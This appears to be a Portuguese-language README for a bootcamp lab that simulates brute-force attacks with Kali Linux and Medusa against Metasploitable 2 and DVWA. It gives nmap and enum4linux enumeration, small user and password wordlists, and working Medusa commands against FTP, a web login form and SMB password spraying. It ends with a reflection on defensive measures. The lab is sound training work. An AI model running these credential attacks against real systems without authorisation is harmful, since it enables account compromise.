# 🔐 Brute Force Lab com Kali Linux + Medusa

## 📌 Descrição
Este projeto tem como objetivo simular ataques de força bruta em um ambiente controlado utilizando Kali Linux, Medusa e sistemas vulneráveis como Metasploitable 2 e DVWA.

---

## 🧪 Ambiente de Laboratório

| Máquina          | Função     | IP Exemplo        |
|-----------------|-----------|------------------|
| Kali Linux      | Atacante  | 192.168.56.101   |
| Metasploitable  | Alvo      | 192.168.56.102   |

---

## 🔍 Reconhecimento (Nmap)

```bash
nmap -sV 192.168.56.102
```

---

## 👤 Criação de Lista de Usuários

```bash
nano usuarios.txt
```

Conteúdo:

```
root
admin
user
msfadmin
postgres
service
test
```

---

## 📂 Criação de Wordlist

```bash
nano senhas.txt
```

Conteúdo:

```
123456
admin
password
msfadmin
12345678
```

---

## 💣 Ataque FTP

```bash
medusa -h 192.168.56.102 -u msfadmin -P senhas.txt -M ftp
```

---

## 🌐 Ataque Web (DVWA)

Acesso:
http://192.168.56.102/dvwa/login.php

```bash
medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M http -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

---

## 🧠 Enumeração SMB

```bash
enum4linux 192.168.56.102
```

---

## 💥 Password Spraying SMB

```bash
medusa -h 192.168.56.102 -U usuarios.txt -p password -M smbnt
```

---


## 📌 Conclusão

Este projeto possibilitou a aplicação prática de conceitos fundamentais de segurança ofensiva, com foco em ataques de força bruta em diferentes serviços, como FTP, aplicações web e SMB. A utilização do Kali Linux em conjunto com a ferramenta Medusa demonstrou, de forma clara, como credenciais fracas ou padrões podem ser facilmente explorados em ambientes mal configurados.

Durante os testes, foi possível observar a eficácia de técnicas como brute force tradicional e password spraying, evidenciando que a ausência de políticas de segurança adequadas representa um risco significativo para qualquer infraestrutura. Além disso, a etapa de enumeração reforçou a importância da exposição controlada de serviços e informações.

Por outro lado, o projeto também destacou a relevância de boas práticas defensivas, como o uso de autenticação multifator (MFA), políticas robustas de senha, limitação de tentativas de login e monitoramento contínuo de logs. Essas medidas são essenciais para mitigar esse tipo de ataque.

Por fim, este laboratório contribuiu para o desenvolvimento de uma visão mais prática e estratégica sobre segurança da informação, reforçando a importância de pensar tanto como atacante quanto como defensor na proteção de sistemas.
Obviamente que este lab é básico, introdutório e apenas nos dá um conhecimento básico sobre a cibersegurança.
A cibersegurança é um assunto muito profundo, que demanda muito estudo, e dedicação, pois não é aplicado uma vez; é uma tarefa diária, constante.
Esse bootcamp que fiz pela DIO em parceria com a Riachuelo foi para conhecer alguns recursos e ferramentas que eu nunca havia trabalhado anteriormente, mas que teve um conteúdo muito bem explicado, com uma didática excepcional.
